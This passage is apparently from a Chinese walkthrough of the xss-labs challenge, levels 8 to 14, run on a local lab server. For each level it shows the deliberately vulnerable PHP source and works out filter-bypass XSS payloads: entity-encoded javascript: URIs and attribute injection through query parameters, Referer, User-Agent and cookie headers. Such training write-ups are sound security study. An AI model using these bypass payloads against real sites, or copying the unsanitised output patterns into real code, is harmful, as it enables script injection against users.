class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p><a href="<scr_ipt &quot; 'oo_nn>">友情链接</a></p><a href="<scr_ipt &quot; 'oo_nn>"><p>单引号没有被处理，尝试使用伪协议</p><p><code>javascript:alert(/xss/)</code></p></a><a href="javascr_ipt:alert(/xss/)"><p>也被处理了，尝试使用<strong>16进制编码</strong></p><p><strong>s</strong>的16进制是 &amp;<strong>#x73;</strong></p><p><code>java&amp;#x73;cript:alert(/xss/)</code></p><p>总结</p><p>hackbar无法提交unicode，<code>&amp;</code>被当成参数了，可以尝试将<code>&amp;</code>进行url编码，或直接在网页的输入payload了</p><p>unicode可以和ascii码混合使用；s的unicode加ascii编码是<code>&amp;#115;</code>，再进行16进制转换是<code>&amp;#x73;</code></p><p>unicode有两种，<code>&amp;#</code>的是web网页上使用的，<code>\u</code>是java上使用的。</p></a><h2 id="level9"><a href="javascr_ipt:alert(/xss/)"></a><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>http://192.168.31.193:8080/level9.php?keyword=not%20bad!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"script"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"on"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"src"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"href"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><a href="您的链接不合法？有没有！"><p>没有显示怎么处理的.</p><p>尝试上有关的payload</p><p><code>java&amp;#x73;cript:alert(/xss/)</code></p></a><a href="您的链接不合法？有没有！"><p>依旧提示<strong>链接不合法</strong>，换成百度**’http://www.baidu.com'**试试。</p><p><code>java&amp;#x73;cript:alert('http://www.baidu.com')</code></p></a><h2 id="level10"><a href="您的链接不合法？有没有！"></a><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>http://192.168.31.193:8080/level10.php?keyword=well%20done!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>没有显示处理内容，但是发现<strong>三个隐藏标签</strong></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可能这些参数处理了内容</p><p>测试这三个参数</p><p><code>?t_link=&lt;script " 'Oonn&gt;</code>没有内容</p><p><code>?t_history=&lt;script " 'Oonn&gt;</code>没有内容</p><p><code>?t_sort=&lt;script " 'Oonn&gt;</code>有内容</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script <span class="token punctuation">"</span></span> <span class="token attr-name">'Oonn"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前后括号被过滤了。</p><p>将payload设置成可以点击可以弹窗的<strong>按钮</strong>。</p><p><code>?t_sort=click"type="button" onclick="alert(/xss/)</code></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>http://192.168.31.193:8080/level11.php?keyword=good%20job!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_ref"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_ref<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>有4个隐藏标签</p><p>使用上一关的payload测试一下第四个参数</p><p><code>?t_ref=click"type="button" onclick="alert(/xss/)</code></p><p>依旧没有结果</p><p>burpsuip抓包查看参数怎么来的</p><p>猜测t_ref是referer地址来源</p><p><img src="/picture/image-20221120190357176.png" alt="image-20221120190357176"></p><p><code>click"type="button" onclick="alert(/xss/)</code></p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>http://192.168.31.193:8080/level12.php?keyword=good%20job!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_ua"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>也没有显示输入的内容，</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_ua<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但也有4个隐藏传参,</p><p>发现t_ua这个参数就是useragent</p><p><img src="/picture/image-20221120191102558.png" alt="image-20221120191102558"></p><p><code>click"type="button" onclick="alert(/xss/)</code></p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>http://192.168.31.193:8080/level13.php?keyword=good%20job!</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"call me maybe?"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str00</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"t_sort"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str11</span><span class="token operator">=</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str22</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str11</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str33</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$str22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center&gt;没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2&gt;"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center&gt;&lt;form id=search&gt;&lt;input name="t_link"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_history"  value="'</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_sort"  value="'</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str00</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;input name="t_cook"  value="'</span><span class="token operator">.</span><span class="token variable">$str33</span><span class="token operator">.</span><span class="token string single-quoted-string">'" type="hidden"&gt;&lt;/form&gt;&lt;/center&gt;'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试过滤了什么</p><p><code>&lt;script " 'Oonn&gt;</code></p><p>也没有显示输入的内容</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_link<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_history<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_sort<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>t_cook<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>call me maybe?<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>4个隐藏参数，猜测t_cook是cookie</p><p><img src="/picture/image-20221120192620976.png" alt="image-20221120192620976"></p><p>改cookie中的user</p><p><img src="/picture/image-20221120192546998.png" alt="image-20221120192546998"></p><p><code>user=click"type="button" onclick="alert(/xss/)</code></p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>http://192.168.31.193:8080/level14.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span>iframe name<span class="token operator">=</span><span class="token string double-quoted-string">"leftframe"</span> marginwidth<span class="token operator">=</span><span class="token number">10</span> marginheight<span class="token operator">=</span><span class="token number">10</span> src<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.exifviewer.org/"</span> frameborder<span class="token operator">=</span>no width<span class="token operator">=</span><span class="token string double-quoted-string">"80%"</span> scrolling<span class="token operator">=</span><span class="token string double-quoted-string">"no"</span> height<span class="token operator">=</span><span class="token number">80</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span>center<span class="token operator">&gt;</span>这关成功后不会自动跳转。成功者<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token operator">/</span>xsschallenge<span class="token operator">/</span>level15<span class="token operator">.</span>php<span class="token operator">?</span>src<span class="token operator">=</span><span class="token number">1.</span>gif<span class="token operator">&gt;</span>点我进level15<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span>这关成功后不会自动跳转。成功者&lt;a 